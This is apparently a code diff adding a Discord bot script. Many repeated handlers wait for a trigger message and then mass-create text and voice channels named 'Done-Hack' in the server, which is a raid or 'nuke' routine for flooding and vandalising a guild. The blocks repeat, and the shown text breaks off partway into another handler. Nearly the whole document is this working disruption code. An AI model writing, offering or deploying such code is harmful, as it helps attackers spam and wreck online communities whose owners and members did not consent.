+client.on('message', message => {
+ if (message.content === x_x) {
+  if (!message.channel.guild) return;
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+
+
+ }
+
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  if (!message.channel.guild) return;
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+
+
+ }
+
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  if (!message.channel.guild) return;
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+
+
+ }
+
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  if (!message.channel.guild) return;
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+
+
+ }
+
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  if (!message.channel.guild) return;
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+
+
+ }
+
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  if (!message.channel.guild) return;
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+
+
+ }
+
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  if (!message.channel.guild) return;
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+
+
+ }
+
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  if (!message.channel.guild) return;
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+  message.guild.createChannel('Done-Hack', 'text');
+  message.guild.createChannel('Done-Hack', 'voice');
+
+
+ }
+
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  if (!message.channel.guild) return;
